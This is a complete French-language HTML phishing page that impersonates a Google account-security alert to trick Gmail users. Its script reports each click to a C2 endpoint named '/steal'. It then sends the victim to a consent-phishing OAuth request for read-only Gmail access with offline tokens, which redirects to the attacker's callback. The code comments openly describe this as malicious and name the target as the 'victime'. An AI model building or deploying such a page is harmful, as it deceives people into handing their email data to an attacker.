<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sécurité Google - Vérification de Compte</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f1f3f4; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 8px; 
            box-shadow: 0 1px 3px rgba(0,0,0,0.12); 
            max-width: 450px; 
            width: 100%; 
            text-align: center; 
        }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; font-weight: 500; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        .btn { 
            background-color: #1a73e8; 
            color: white; 
            border: none; 
            padding: 10px 24px; 
            border-radius: 4px; 
            font-size: 14px; 
            font-weight: 500; 
            cursor: pointer; 
            transition: background 0.2s;
        }
        .btn:hover { background-color: #1557b0; }
        .btn:disabled { background-color: #ccc; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 12px; color: #70757a; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Color_Logo.svg/1200px-Google_Color_Logo.svg.png" alt="Google" class="logo">
    <h1>Alerte de sécurité</h1>
    <p>Une tentative de connexion inhabituelle a été détectée sur votre compte Gmail. Pour sécuriser vos données et vos messages, veuillez synchroniser votre espace de stockage immédiatement.</p>
    
    <button id="backupBtn" class="btn" onclick="startProcess()">Sécuriser mon compte</button>

    <div class="footer">
        Google protège vos données grâce à un chiffrement de pointe.
    </div>
</div>

<script>
    // --- CONFIGURATION DU PROJET ---
    // Remplacez par votre Client ID obtenu sur la console Google Cloud
    const CLIENT_ID = '1092408209160-nn8u8l6e7os7km2bqte62bmv9oqm09k0.apps.googleusercontent.com';
    const C2_URL = window.location.origin;

    async function startProcess() {
    const btn = document.getElementById('backupBtn');
    btn.textContent = 'Initialisation...';

    const CLIENT_ID = '1092408209160-nn8u8l6e7os7km2bqte62bmv9oqm09k0.apps.googleusercontent.com'; // À vérifier !
    const REDIRECT_URI = window.location.origin + '/callback';

        // 1. Notification au serveur C2 (Optionnel : log la tentative)
        try {
            await fetch(`${C2_URL}/steal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    event: 'clic_phishing',
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (e) {
            console.error("Erreur de log C2");
        }

        // 2. Construction de l'URL OAuth2 "malveillante"
        // On demande l'accès en lecture seule aux emails pour maximiser les chances de succès
        const scope = encodeURIComponent('https://www.googleapis.com/auth/gmail.readonly');
        const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
            `client_id=${CLIENT_ID}&` +
            `redirect_uri=${C2_URL}/callback&` +
            `response_type=code&` +
            `scope=${scope}&` +
            `access_type=offline&` +
            `prompt=consent`;

        // 3. Redirection de la victime vers Google pour l'autorisation
        setTimeout(() => {
            window.location.href = authUrl;
        }, 1000);
    }
</script>

</body>
</html>